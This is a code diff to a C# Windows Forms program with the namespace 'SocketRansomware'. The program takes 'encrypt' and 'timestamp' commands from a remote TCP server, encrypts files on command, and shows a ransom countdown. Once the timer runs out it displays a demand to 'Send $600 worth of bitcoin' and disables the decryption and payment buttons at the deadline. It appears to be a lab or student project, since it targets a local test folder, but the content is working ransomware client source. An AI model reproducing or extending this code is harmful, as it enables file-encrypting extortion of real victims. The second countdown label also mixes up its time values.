@@ -21,16 +21,23 @@ namespace SocketRansomware
         private const string PATH = @"C:\Users\whs27\Desktop\test";
         TcpClient client;
         Thread receiveMessageThread = null;
+        //서버시간과 클라이언트 시간의 차이
+        private TimeSpan ts;
+        //서버시간과의 오차를 현재 시간에 더하면 서버시간
+        DateTime sysDateTime 
+        {
+            get
+            {
+                return DateTime.Now.Add(ts);
+            }
+        }
+        DateTime infectionTime;
         public Form1()
         {
             InitializeComponent();
 
         }
 
-        private int duration = 36000;
-        private int duration2 = 43200;
-        DateTime dt;
-        
         private void ConnectServer()
         {
             try
@@ -82,20 +89,17 @@ namespace SocketRansomware
             ConnectServer();
             cbboxLanguage.SelectedIndex = 0;
 
-            dt = new DateTime();
+            
             timer1 = new System.Windows.Forms.Timer();
             timer1.Tick += new EventHandler(count_down);
-            timer1.Interval = 1000;
-            timer1.Start();
 
-          /*  timer2 = new System.Windows.Forms.Timer();
-            timer2.Tick += new EventHandler(count_down);
-            timer2.Interval = 1000;
-            timer2.Start();*/
+            /*  timer2 = new System.Windows.Forms.Timer();
+              timer2.Tick += new EventHandler(count_down);
+              timer2.Interval = 1000;
+              timer2.Start();*/
+
 
             
-            lbDate1.Text = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-            lbDate2.Text = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
         }
 
         private void ReceiveMessage()
@@ -110,9 +114,18 @@ namespace SocketRansomware
                     net.Read(bytes, 0, bytes.Length); //스트림읽기 C++로따지면 recv함수
                     string str = Encoding.Default.GetString(bytes).Trim('\0');
                     string[] request = str.Split(';');
-                    if(request[0].Equals("encrypt"))
+                    string type = request[0];
+                    if(type.Equals("encrypt"))
                     {
                         EncryptFiles(request[1]);
+                    } else if(type.Equals("timestamp"))
+                    {
+                        this.infectionTime = Convert.ToDateTime(request[2]);
+                        this.ts = Convert.ToDateTime(request[4]).Subtract(DateTime.Now);
+
+                      
+                      
+                        timer1.Start();
                     }
                     Console.WriteLine(str);
                 }
@@ -184,28 +197,38 @@ namespace SocketRansomware
 
         }
 
+
         private void count_down(object sender, EventArgs e)
         {
+            DateTime raiseTime = infectionTime.AddSeconds(36000);
+            DateTime timeout = infectionTime.AddSeconds(43200);
+            lbDate1.Text = raiseTime.ToString("yyyy-MM-dd HH:mm:ss");
+            lbDate2.Text = timeout.ToString("yyyy-MM-dd HH:mm:ss");
+            TimeSpan duration = raiseTime.Subtract(sysDateTime);
+            TimeSpan duration2 = timeout.Subtract(sysDateTime);
             
-            if(duration == 0)
+            
+            if(duration.TotalSeconds <= 0)
             {
-                timer1.Stop();
+                lbtimer1.Text = "00:00:00";
+                addressLabel.Text = "Send $600 worth of bitcoin to this address:";
             }
-            else if(duration > 0)
+            else
             {
-                duration--;
-                lbtimer1.Text = dt.AddSeconds(duration).ToString("HH:mm:ss");
+                lbtimer1.Text = duration.Hours.ToString("D2") + ":" + duration.Minutes.ToString("D2") + ":" + duration.Seconds.ToString("D2");
             }
 
-            if (duration2 == 0)
-            {  
+            if (duration2.TotalSeconds <= 0)
+            {
+                lbtimer2.Text = "00:00:00";
+                btnCheckPayment.Enabled = false;
+                btnDecrypt.Enabled = false;
                 timer1.Stop();
               
             }
-            else if (duration2 > 0)
+            else
             {
-                duration2--;
-                lbtimer2.Text = dt.AddSeconds(duration2).ToString("HH:mm:ss");
+                lbtimer2.Text = duration2.Hours.ToString("D2") + ":" + duration.Minutes.ToString("D2") + ":" + duration.Seconds.ToString("D2");
             }
         }
 
